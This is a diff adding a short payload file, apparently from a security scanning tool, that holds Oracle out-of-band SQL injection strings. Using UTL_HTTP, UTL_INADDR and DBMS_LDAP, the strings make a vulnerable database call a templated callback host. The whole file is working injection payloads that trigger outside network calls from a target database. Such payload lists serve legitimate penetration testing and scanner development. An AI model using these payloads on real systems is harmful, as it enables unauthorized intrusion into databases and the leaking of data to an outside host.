@@ -1,0 +1,5 @@
+# Oracle OOB payloads - requires UTL_HTTP permission
+# {{CALLBACK}} replaced with callback URL (HTTP-based)
+' || UTL_HTTP.REQUEST('http://{{CALLBACK}}') || '
+' || UTL_INADDR.GET_HOST_ADDRESS('{{CALLBACK}}') || '
+' || DBMS_LDAP.INIT('{{CALLBACK}}',389) || '
